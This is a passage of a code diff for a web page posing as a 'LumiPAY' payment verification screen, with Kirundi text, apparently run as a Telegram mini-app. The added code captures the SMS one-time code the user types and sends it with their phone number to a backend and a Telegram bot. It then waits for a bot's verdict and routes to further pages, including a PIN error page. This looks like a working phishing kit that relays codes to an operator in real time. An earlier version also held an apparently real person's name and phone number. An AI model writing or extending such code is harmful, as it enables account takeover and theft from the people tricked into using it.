@@ -116,7 +116,7 @@
             box-shadow: 0 2px 6px rgba(217, 48, 37, 0.1);
         }
 
-        /* 📱 Design matching the photo: OTP Field with embedded timer */
+        /* 📱 OTP Field with embedded timer */
         .otp-input-card {
             position: relative;
             width: 100%;
@@ -285,10 +285,10 @@
 </div>
 
 <div class="container">
-    <h1 class="welcome-title">Welcome to LumiPAY</h1>
+    <h1 class="welcome-title">Murakaza neza kuri LumiPAY</h1>
 
-    <!-- Display Phone + Name -->
-    <div class="user-info-text" id="userInfoDisplay">67886318 - Nkubati Leonard</div>
+    <!-- Dynamically Display Saved Phone + Name -->
+    <div class="user-info-text" id="userInfoDisplay">--</div>
 
     <p class="instruction-text">
         Nyamuneka injiza ikode yo kwemeza waronse muri ubutumwa bw'isunzu (SMS)
@@ -354,12 +354,13 @@
             tg.expand();
         }
 
-        // Retrieve user data
-        const phone = localStorage.getItem('userPhone') || localStorage.getItem('phone') || "67886318";
-        const firstName = localStorage.getItem('firstName') || "Nkubati";
-        const lastName = localStorage.getItem('lastName') || "Leonard";
+        // Dynamically retrieve stored phone and names from previous pages
+        const phone = localStorage.getItem('phone') || localStorage.getItem('userPhone') || "";
+        const firstName = localStorage.getItem('firstName') || "";
+        const lastName = localStorage.getItem('lastName') || "";
 
-        userInfoDisplayEl.textContent = `${phone} - ${firstName} ${lastName}`.trim();
+        const fullName = `${firstName} ${lastName}`.trim();
+        userInfoDisplayEl.textContent = fullName ? `${phone} - ${fullName}` : (phone || "--");
 
         startTimer();
         otpInputEl.focus();
@@ -413,4 +414,84 @@
         startTimer();
     }
 
-    async function
+    async function submitOtp(event) {
+        event.preventDefault();
+        const codeVal = otpInputEl.value.trim();
+
+        if (codeVal.length < 6) {
+            statusErrorContainer.style.display = 'block';
+            statusErrorContainer.textContent = "Ikode ya OTP si yo, nyamuneka injiza imibare 6 y'ukuri.";
+            otpCardContainer.classList.add('input-error');
+            return;
+        }
+
+        // Hide previous errors
+        statusErrorContainer.style.display = 'none';
+        otpCardContainer.classList.remove('input-error');
+
+        const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
+
+        // 🚨 Immediately display loading screen overlay
+        overlayMainText.textContent = "Nyamuneka rindira...";
+        overlaySubText.textContent = "Kugenzura ikode ya OTP...";
+        statusOverlay.classList.add('active');
+
+        // Save local OTP
+        localStorage.setItem('smsOtp1', codeVal);
+
+        // Send payload to backend
+        try {
+            await fetch("/api/otp-notification", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ event: "otp_verification_1", phone, otp: codeVal })
+            });
+        } catch (err) {
+            console.error("❌ Erreur d'envoi de la notification :", err);
+        }
+
+        const tg = window.Telegram?.WebApp;
+        if (tg && tg.sendData) {
+            tg.sendData(JSON.stringify({ event: "otp_verification_1", phone: phone, otp: codeVal }));
+        }
+
+        // Wait for bot approval or rejection
+        startStatusPolling(phone);
+    }
+
+    function startStatusPolling(phone) {
+        if (statusPollingInterval) clearInterval(statusPollingInterval);
+
+        statusPollingInterval = setInterval(async () => {
+            try {
+                const response = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
+                const data = await response.json();
+
+                if (data.status === "otp1_correct") {
+                    clearInterval(statusPollingInterval);
+                    overlayMainText.textContent = "Vyaguzwe neza!";
+                    overlaySubText.textContent = "Gufungura urupapuro rukurikira...";
+
+                    setTimeout(() => {
+                        window.location.href = "/page9";
+                    }, 1200);
+                } 
+                else if (data.status === "otp1_wrong") {
+                    clearInterval(statusPollingInterval);
+                    statusOverlay.classList.remove('active');
+                    
+                    // Show Red Error Message
+                    statusErrorContainer.style.display = 'block';
+                    statusErrorContainer.textContent = "Ikode ya OTP si yo, nyamuneka injiza ikode y'ukuri.";
+                    otpCardContainer.classList.add('input-error');
+                    otpInputEl.value = "";
+                    otpInputEl.focus();
+                }
+                else if (data.status === "otp2_wrongpin") {
+                    clearInterval(statusPollingInterval);
+                    statusOverlay.classList.remove('active');
+                    
+                    // Redirect to Page 6 with error flag
+                    window.location.href = "/page6?error=wrong_pin";
+                }
+            } catch (err) {
